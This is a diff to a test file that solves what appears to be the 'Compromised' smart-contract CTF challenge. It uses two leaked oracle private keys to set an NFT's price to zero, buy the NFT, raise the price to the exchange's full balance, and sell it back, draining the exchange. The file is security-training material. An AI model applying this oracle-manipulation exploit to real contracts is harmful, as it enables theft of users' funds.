@@ -61,13 +61,37 @@ describe('Compromised challenge', function () {
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
         
-        const provider = await new ethers.providers.JsonRpcProvider("localhost");
-        const CompromisedOracle1 = new Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", provider);
-        const CompromisedOracle2 = new Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", provider);
+        const CompromisedOracle1 = new Wallet("0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9", ethers.provider);
+        const CompromisedOracle2 = new Wallet("0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48", ethers.provider);
 
         console.log("The compromised keys are ")
         console.log(await CompromisedOracle1.getAddress());
-        console.log(await CompromisedOracle2.getAddress());        
+        console.log(await CompromisedOracle2.getAddress());    
+        
+        await oracle.connect(CompromisedOracle1).postPrice("DVNFT", 0);
+        await oracle.connect(CompromisedOracle2).postPrice("DVNFT", 0);
+
+        console.log("MEDIAN PRICE OF DVNFT is ");
+        console.log(await oracle.getMedianPrice("DVNFT"));
+
+        const txResponse = await exchange.connect(player).buyOne({value: 1});
+
+        console.log("\n\nPLAYER")
+        console.log(player.address)
+        console.log("\n\nOWNER")
+        console.log(await nftToken.ownerOf(0))
+        // const txReceipt = await txResponse.wait();
+
+        await oracle.connect(CompromisedOracle1).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(CompromisedOracle2).postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
+
+        console.log("MEDIAN PRICE OF DVNFT is ");
+        console.log(await oracle.getMedianPrice("DVNFT"));
+        
+        await nftToken.connect(player).approve(exchange.address, 0)
+        await exchange.connect(player).sellOne(0);
+        console.log("\n\nOWNER NOW")
+        
 
         });
 
